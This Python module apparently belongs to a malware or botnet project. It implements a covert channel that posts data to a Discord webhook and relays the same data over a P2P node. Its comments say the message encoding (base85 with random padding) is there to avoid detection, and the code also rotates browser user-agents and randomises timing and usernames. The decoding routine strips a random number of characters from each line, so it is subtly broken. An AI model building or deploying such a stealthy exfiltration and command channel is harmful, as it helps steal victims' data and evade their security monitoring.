import os
import json
import time
import base64
import random
import socket
import struct
import requests
import threading
from typing import Dict, List, Optional
from datetime import datetime
import queue
import logging
from .p2p import P2PNode

class DiscordComms:
    def __init__(self, webhook_url: str):
        self.webhook_url = webhook_url
        self.message_queue = queue.Queue()
        self.running = False
        self.last_send = 0
        self.min_delay = 60  # 1 minute minimum between messages
        self.max_delay = 300  # 5 minutes maximum
        self.max_retries = 3
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
    def _encode_message(self, data: Dict) -> str:
        """Encode message to avoid detection"""
        try:
            # Convert to JSON and encode
            json_data = json.dumps(data)
            encoded = base64.b85encode(json_data.encode()).decode()
            
            # Split into chunks and add random padding
            chunks = []
            chunk_size = random.randint(100, 200)
            for i in range(0, len(encoded), chunk_size):
                chunk = encoded[i:i + chunk_size]
                padding = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 15)))
                chunks.append(f"{padding}{chunk}")
                
            return '\n'.join(chunks)
        except:
            return ''
            
    def _decode_message(self, message: str) -> Optional[Dict]:
        """Decode message from Discord"""
        try:
            # Remove padding and join chunks
            chunks = []
            for line in message.split('\n'):
                # Remove random padding (first 5-15 chars)
                chunk = line[random.randint(5, 15):]
                chunks.append(chunk)
                
            # Decode complete message
            encoded = ''.join(chunks)
            json_data = base64.b85decode(encoded).decode()
            return json.loads(json_data)
        except:
            return None
            
    def _send_message(self, data: Dict) -> bool:
        """Send message through Discord webhook"""
        try:
            # Respect rate limits
            current_time = time.time()
            if current_time - self.last_send < self.min_delay:
                time.sleep(self.min_delay - (current_time - self.last_send))
                
            # Encode message
            message = self._encode_message(data)
            if not message:
                return False
                
            # Prepare request
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': random.choice(self.user_agents)
            }
            
            payload = {
                'content': message,
                'username': f'user-{random.randint(1000,9999)}'
            }
            
            # Send with retries
            for _ in range(self.max_retries):
                try:
                    response = requests.post(
                        self.webhook_url,
                        headers=headers,
                        json=payload,
                        timeout=10
                    )
                    
                    if response.status_code == 204:
                        self.last_send = time.time()
                        return True
                        
                    # Handle rate limits
                    if response.status_code == 429:
                        retry_after = response.json().get('retry_after', 5)
                        time.sleep(retry_after)
                        continue
                        
                except:
                    time.sleep(random.uniform(1, 5))
                    continue
                    
            return False
        except:
            return False
            
    def _process_queue(self):
        """Process message queue"""
        while self.running:
            try:
                # Get message from queue
                data = self.message_queue.get(timeout=1)
                
                # Try to send
                if not self._send_message(data):
                    # Put back in queue if failed
                    self.message_queue.put(data)
                    
                # Random delay between messages
                time.sleep(random.uniform(self.min_delay, self.max_delay))
                
            except queue.Empty:
                continue
            except:
                continue
                
    def start(self):
        """Start message processor"""
        if self.running:
            return
            
        self.running = True
        threading.Thread(target=self._process_queue, daemon=True).start()
        
    def stop(self):
        """Stop message processor"""
        self.running = False
        
    def send_data(self, data: Dict):
        """Queue data for sending"""
        try:
            self.message_queue.put(data)
            return True
        except:
            return False
            
class SecureComms:
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.discord = None
        self.p2p = P2PNode(config)
        self.message_queue = queue.Queue()
        self.running = False
        
        # Initialize Discord if webhook provided
        webhook_url = self.config.get('discord_webhook')
        if webhook_url:
            self.discord = DiscordComms(webhook_url)
            
    def start(self):
        """Start all communication channels"""
        if self.running:
            return
            
        self.running = True
        
        # Start Discord comms
        if self.discord:
            self.discord.start()
            
        # Start P2P node
        self.p2p.start()
        
        # Start message processor
        threading.Thread(target=self._process_queue, daemon=True).start()
        
    def stop(self):
        """Stop all communication channels"""
        self.running = False
        
        if self.discord:
            self.discord.stop()
            
        self.p2p.stop()
        
    def _process_queue(self):
        """Process message queue"""
        while self.running:
            try:
                # Get message from queue
                data = self.message_queue.get(timeout=1)
                
                # Try Discord first
                if self.discord:
                    self.discord.send_data(data)
                    
                # Also relay through P2P
                self.p2p.broadcast_data(data)
                
            except queue.Empty:
                continue
            except:
                continue
                
    def send_data(self, data: Dict):
        """Queue data for sending"""
        try:
            self.message_queue.put(data)
            return True
        except:
            return False
